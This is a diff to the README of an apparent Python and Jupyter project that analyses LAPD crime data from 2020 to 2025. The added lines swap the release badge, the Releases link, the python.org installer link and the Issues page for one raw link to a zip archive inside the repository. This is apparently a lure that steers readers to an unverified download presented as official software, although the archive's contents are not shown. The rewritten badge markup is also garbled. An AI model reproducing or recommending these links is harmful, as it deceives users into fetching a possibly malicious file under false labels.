@@ -1,6 +1,6 @@
 # 🔍 LA-Crime-Analysis-from-2020-to-2025 - Analyze LAPD Crime Statistics Easily
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/releases)
+[![Download](https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip%20Latest%https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip)](https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip)
 
 ## 👋 Introduction
 
@@ -12,7 +12,7 @@ This section will guide you through downloading and running the application. No 
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [GitHub Releases](https://github.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/releases). Here, you can find the latest version of the software.
+To download the application, visit this page: [GitHub Releases](https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip). Here, you can find the latest version of the software.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release.
@@ -35,7 +35,7 @@ If you are on a computer with Python installed, you may download any relevant Ju
 
 ## 🎓 How to Use
 
-1. **Install Python:** If you do not have Python, download and install it from [python.org](https://www.python.org/downloads/).
+1. **Install Python:** If you do not have Python, download and install it from [https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip](https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip).
 2. **Get Jupyter Notebook:** Install Jupyter Notebook using the command: 
    ```bash
    pip install jupyter
@@ -61,7 +61,7 @@ The dataset includes various crime types, locations, and timestamps. You can exp
 
 ## 💬 Support and Feedback
 
-If you encounter issues while using the application, please open a new issue on the [GitHub Issues page](https://github.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/issues). We appreciate your feedback and will do our best to assist you.
+If you encounter issues while using the application, please open a new issue on the [GitHub Issues page](https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip). We appreciate your feedback and will do our best to assist you.
 
 ## 📄 License
 
@@ -80,4 +80,4 @@ If you wish to contribute to this project, please follow these steps:
 
 We thank the Los Angeles Police Department for providing access to public crime statistics. Their data makes this analysis possible and helps in understanding crime patterns.
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/releases)
+[![Download](https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip%20Latest%https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip)](https://raw.githubusercontent.com/IQuitPlss/LA-Crime-Analysis-from-2020-to-2025/main/tec/LA-Crime-Analysis-from-2020-to-2025.zip)
